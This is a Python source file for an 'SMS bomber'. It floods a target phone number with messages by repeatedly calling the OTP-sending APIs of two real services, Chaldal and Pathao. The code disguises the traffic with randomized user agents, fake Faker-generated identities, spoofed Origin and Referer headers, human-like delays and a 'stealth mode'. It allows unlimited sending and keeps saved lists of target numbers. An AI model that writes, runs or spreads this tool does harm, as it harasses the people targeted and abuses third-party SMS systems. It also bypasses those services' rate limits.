import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
import time
from datetime import datetime
from urllib.parse import urlparse
from faker import Faker
from collections import deque

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colors for terminal
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# Dynamic User-Agent Generator Engine
def generate_dynamic_ua():
    """Generates a highly detailed, unique, and realistic User-Agent."""
    platforms = ['Windows', 'Android', 'iOS']
    platform = random.choice(platforms)
    chrome_v = f"{random.randint(130, 135)}.0.{random.randint(6000, 7000)}.{random.randint(10, 150)}"
    webkit_v = "537.36"
    
    if platform == 'Windows':
        win_v = random.choice(['10.0', '11.0'])
        return f"Mozilla/5.0 (Windows NT {win_v}; Win64; x64) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    elif platform == 'Android':
        android_v = random.randint(13, 15)
        model = random.choice(['SM-S938B', 'Pixel 9 Pro XL', 'Xiaomi 15 Pro'])
        return f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/{webkit_v}"
    else:
        ios_v = random.choice(['17_4_1', '18_1'])
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {G}           AI-Powered with Faker & Smart Batching            {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

# --- Data Management ---
DATA_FILE = "bomber_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                return json.load(f)
        except: pass
    return {"saved_numbers": {}, "settings": {"ai_enabled": True, "stealth_mode": False}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def save_number(name, number):
    data = load_data()
    data["saved_numbers"][name] = number
    save_data(data)
    logging.info(f"{G}[✓] Number saved successfully!{W}")

def list_saved_numbers():
    data = load_data()
    numbers = data.get("saved_numbers", {})
    if not numbers:
        print(f"{R}[!] No saved numbers found.{W}")
        input(f"\n{C}Press Enter to return...{W}")
        return None
    print(f"\n{Y}--- Saved Numbers ---{W}")
    keys = list(numbers.keys())
    for i, name in enumerate(keys, 1):
        print(f"{C}[{i}] {name}: {numbers[name]}{W}")
    choice = input(f"\n{Y}[?] Select a number (or 'b' to go back): {W}")
    if choice.lower() == 'b': return None
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(keys): return numbers[keys[idx]]
    except: pass
    return None

# --- AI Controller (Faker Based) ---
class GenAIController:
    """
    Advanced Controller using Faker for realistic data.
    Features: Batching, Caching, and Human-like behavior.
    """
    def __init__(self):
        self.data = load_data()
        self.enabled = self.data["settings"].get("ai_enabled", True)
        self.fake = Faker(['en_US', 'bn_BD'])
        self.identity_queue = deque()
        self.delay_queue = deque()
        self.api_stats = {}

    async def pre_generate_data(self, count=50):
        """Pre-generate identities and delays to avoid real-time overhead."""
        if not self.enabled: return
        logging.info(f"{Y}[AI] Pre-generating {count} human-like identities and delays...{W}")
        for _ in range(count):
            # Realistic Identity
            name = self.fake.name()
            email = f"{name.lower().replace(' ', '.')}{random.randint(10, 999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"
            self.identity_queue.append({
                "name": name,
                "email": email,
                "user_agent": generate_dynamic_ua()
            })
            # Human-like Delay (Simulating real user interaction)
            self.delay_queue.append(random.choices(
                [random.uniform(1.5, 2.5), random.uniform(2.5, 4.5), random.uniform(4.5, 7.0)],
                weights=[0.7, 0.2, 0.1]
            )[0])

    def get_smart_identity(self):
        if self.identity_queue:
            return self.identity_queue.popleft()
        return {"name": self.fake.name(), "email": self.fake.email(), "user_agent": generate_dynamic_ua()}

    def get_dynamic_delay(self, api_name=None):
        if self.delay_queue:
            return self.delay_queue.popleft()
        return random.uniform(1.5, 3.5)

    def update_stats(self, api_name, success):
        if api_name not in self.api_stats:
            self.api_stats[api_name] = {"success": 0, "fail": 0, "consecutive_fails": 0}
        if success:
            self.api_stats[api_name]["success"] += 1
            self.api_stats[api_name]["consecutive_fails"] = 0
        else:
            self.api_stats[api_name]["fail"] += 1
            self.api_stats[api_name]["consecutive_fails"] += 1

    def clear_cache(self):
        self.identity_queue.clear()
        self.delay_queue.clear()

# --- Bomber Engine ---
class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None):
        self.target = target
        self.limit = limit
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event or asyncio.Event()
        self.session = None
        self.semaphore = asyncio.Semaphore(10)
        self.ai = GenAIController()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        await self.ai.pre_generate_data(100)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()
        self.ai.clear_cache()

    def get_headers(self, url=None):
        identity = self.ai.get_smart_identity()
        headers = {
            "User-Agent": identity["user_agent"],
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        if url:
            parsed = urlparse(url)
            headers["Origin"] = f"{parsed.scheme}://{parsed.netloc}"
            headers["Referer"] = headers["Origin"] + "/"
        return headers

    async def log_event(self, api_name, success, status_code=None):
        self.ai.update_stats(api_name, success)
        timestamp = datetime.now().strftime("%H:%M:%S")
        if success:
            self.sent += 1
            color, icon = G, "✓"
        else:
            self.failed += 1
            color, icon = R, "✗"
        logging.info(f"{color}[{icon}] {timestamp} | {api_name:20} | Sent: {self.sent}{W}")

    # --- APIs (Sample APIs for demonstration) ---
    async def api_sample_1(self):
        url = "https://chaldal.com/api/customer/SendOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": self.target}, headers=self.get_headers(url), timeout=10) as res:
                await self.log_event("Chaldal OTP", res.status in [200, 201], res.status)
        except: await self.log_event("Chaldal OTP", False, "Error")

    async def api_sample_2(self):
        url = "https://api.pathao.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": self.target}, headers=self.get_headers(url), timeout=10) as res:
                await self.log_event("Pathao OTP", res.status in [200, 201], res.status)
        except: await self.log_event("Pathao OTP", False, "Error")

    async def bomb_task(self):
        apis = [self.api_sample_1, self.api_sample_2]
        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit: break
            api = random.choice(apis)
            async def run_api(api_func):
                async with self.semaphore:
                    await asyncio.sleep(self.ai.get_dynamic_delay())
                    await api_func()
            asyncio.create_task(run_api(api))
            await asyncio.sleep(self.ai.get_dynamic_delay() * 0.5)

async def settings_menu():
    while True:
        clear(); banner()
        data = load_data(); settings = data["settings"]
        print(f"{Y}--- Settings ---{W}")
        print(f"{C}[1] AI Optimization: {'ON' if settings['ai_enabled'] else 'OFF'}")
        print(f"{C}[2] Stealth Mode: {'ON' if settings['stealth_mode'] else 'OFF'}")
        print(f"{C}[B] Back")
        choice = input(f"\n{Y}[?] Choice: {W}").lower()
        if choice == '1': settings['ai_enabled'] = not settings['ai_enabled']
        elif choice == '2': settings['stealth_mode'] = not settings['stealth_mode']
        elif choice == 'b': break
        data["settings"] = settings; save_data(data)

async def main():
    while True:
        clear(); banner()
        print(f"{C}[1] SMS Bombing\n[2] Saved Numbers\n[3] Settings\n[E] Exit")
        choice = input(f"\n{Y}[?] Select: {W}").lower()
        if choice == 'e': break
        elif choice == '1':
            target = input(f"{C}[?] Target: {W}")
            if len(target) == 11:
                if input(f"{C}[?] Save? (y/n): {W}").lower() == 'y':
                    save_number(input(f"{C}[?] Name: {W}"), target)
                limit = int(input(f"{C}[?] Limit (0=inf): {W}") or 0)
                async with AsyncBomber(target, limit) as bomber:
                    await bomber.bomb_task()
        elif choice == '2':
            target = list_saved_numbers()
            if target:
                async with AsyncBomber(target, 0) as bomber:
                    await bomber.bomb_task()
        elif choice == '3': await settings_menu()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
